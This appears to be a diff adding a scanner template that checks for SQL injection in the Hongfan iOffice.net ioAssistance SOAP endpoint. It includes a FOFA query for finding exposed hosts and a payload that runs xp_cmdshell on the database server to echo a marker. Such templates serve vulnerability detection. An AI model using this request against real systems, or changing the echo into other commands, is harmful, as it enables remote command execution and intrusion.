@@ -1,0 +1,24 @@
+info:
+  vulId: hongfan_sqli_ioAssistance
+  detail: 红帆系统ioAssistance sql注入漏洞(可尝试使用xp_cmdshell执行命令)
+  fofaQuery: title="iOffice.net" || body="/iOffice/js" || (body="iOffice.net" && header!="couchdb" && header!="drupal") || body="iOfficeOcxSetup.exe" || body="Hongfan. All Rights Reserved"
+rules:
+  - request:
+      payload:
+        - "exec master.dbo.xp_cmdshell 'echo 12345678910'"
+      path: "{{rootUrl}}/iOffice/prg/set/wss/ioAssistance.asmx"
+      method: POST
+      headers:
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+      redirect: false
+      dataTtpe: text
+      data: "<?xml version=\"1.0\"  encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \r\nxmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"  xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n<soap:Body>\r\n<GetLoginedEmpNoReadedInf xmlns=\"http://tempuri.org/\">\r\n<sql>{{payload}}</sql>\r\n</GetLoginedEmpNoReadedInf>\r\n</soap:Body>\r\n</soap:Envelope>"
+
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - 12345678910
+        place: body
+        condition: and
